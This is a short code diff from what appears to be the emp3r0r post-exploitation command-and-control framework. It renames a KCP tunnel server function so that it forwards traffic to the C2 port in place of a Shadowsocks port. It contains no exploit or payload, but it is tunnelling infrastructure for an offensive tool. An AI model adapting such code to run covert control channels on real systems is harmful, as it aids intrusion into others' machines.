@@ -10,9 +10,9 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 )
 
-// KCPSSListenAndServe KCP server for Shadowsocks
-func KCPSSListenAndServe() {
+// KCPC2ListenAndServe KCP server that forwards to C2 port
+func KCPC2ListenAndServe() {
 	ctx, cancel := context.WithCancel(context.Background())
-	tun.KCPTunServer("127.0.0.1:"+RuntimeConfig.ShadowsocksServerPort,
+	tun.KCPTunServer("127.0.0.1:"+RuntimeConfig.CCPort,
 		RuntimeConfig.KCPServerPort, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
 }
